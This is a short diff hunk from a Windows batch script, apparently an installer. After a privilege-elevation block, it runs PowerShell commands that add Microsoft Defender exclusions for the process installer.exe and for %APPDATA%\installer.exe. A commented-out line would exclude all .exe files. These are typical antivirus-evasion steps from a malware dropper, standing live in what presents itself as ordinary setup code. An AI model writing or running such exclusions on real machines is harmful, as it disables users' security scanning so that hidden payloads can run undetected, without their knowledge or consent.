@@ -26,7 +26,6 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
-
 :: powershell.exe -Command "Set-MpPreference -ExclusionExtension exe"
 powershell.exe -Command "Set-MpPreference -ExclusionProcess installer.exe"
 powershell.exe -Command "Add-MpPreference -ExclusionPath %APPDATA%\installer.exe"
